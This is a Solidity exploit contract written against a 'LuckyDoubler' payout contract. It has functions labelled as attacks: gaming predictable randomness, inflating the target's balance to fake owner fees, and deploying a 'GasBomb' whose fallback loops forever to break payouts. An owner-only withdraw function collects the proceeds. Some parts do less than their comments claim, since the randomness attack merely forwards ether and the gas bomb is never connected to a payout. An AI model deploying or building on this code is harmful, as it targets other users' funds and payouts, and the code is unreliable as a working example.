pragma solidity ^0.4.0;

interface ILuckyDoubler {
    function() external payable;
}

contract LuckyDoublerExploit {
    ILuckyDoubler public target;
    address public owner;

    constructor(address _target) public {
        target = ILuckyDoubler(_target);
        owner = msg.sender;
    }

    // Attack: spam entries and exploit predictable randomness
    function exploitRandomness() external payable {
        require(msg.value == 1 ether);
        target.call.value(1 ether)();
    }

    // Attack: fund the contract directly to inflate this.balance
    function inflateBalance() external payable {
        // this ETH won't be tracked by internal 'balance'
        // but will inflate `this.balance` => fake "fees" for owner.send()
    }

    // Attack: deploy multiple contracts for DoS via gas bomb
    function createGasBomb() external {
        new GasBomb();
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function() external payable {}
}

// Fallback gas bomb to break send()
contract GasBomb {
    function() external payable {
        while (true) {} // gas loop => block payout
    }
}

